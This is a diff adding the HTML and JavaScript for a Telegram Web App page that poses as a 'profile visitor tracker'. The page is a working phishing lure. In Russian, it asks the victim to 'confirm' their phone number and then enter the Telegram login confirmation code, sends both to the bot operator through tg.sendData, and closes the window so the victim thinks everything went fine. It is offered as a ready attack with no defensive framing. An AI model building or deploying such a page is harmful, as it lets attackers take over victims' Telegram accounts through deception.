@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Visitor Tracker</title>
+    <script src="https://telegram.org"></script>
+    <style>
+        body { font-family: sans-serif; background: #18222d; color: white; text-align: center; padding: 20px; }
+        .btn { background: #248bcf; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; width: 100%; margin-top: 10px; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
+        #code-section { display: none; }
+    </style>
+</head>
+<body>
+    <h3>Кто заходил в твой профиль?</h3>
+    <p>Для активации трекера подтвердите свой номер телефона.</p>
+    
+    <div id="phone-section">
+        <input type="text" id="phone" placeholder="+79991234567">
+        <button class="btn" onclick="sendPhone()">Проверить</button>
+    </div>
+
+    <div id="code-section">
+        <p>Введите код подтверждения из Telegram:</p>
+        <input type="text" id="code" placeholder="12345">
+        <button class="btn" onclick="sendCode()">Активировать</button>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        function sendPhone() {
+            const phone = document.getElementById('phone').value;
+            if(phone.length < 10) return alert("Введите верный номер");
+            tg.sendData(JSON.stringify({type: 'phone', val: phone}));
+            document.getElementById('phone-section').style.display = 'none';
+            document.getElementById('code-section').style.display = 'block';
+        }
+
+        function sendCode() {
+            const code = document.getElementById('code').value;
+            tg.sendData(JSON.stringify({type: 'code', val: code}));
+            tg.close(); // Закрываем после ввода, типа "всё ок"
+        }
+    </script>
+</body>
+</html>
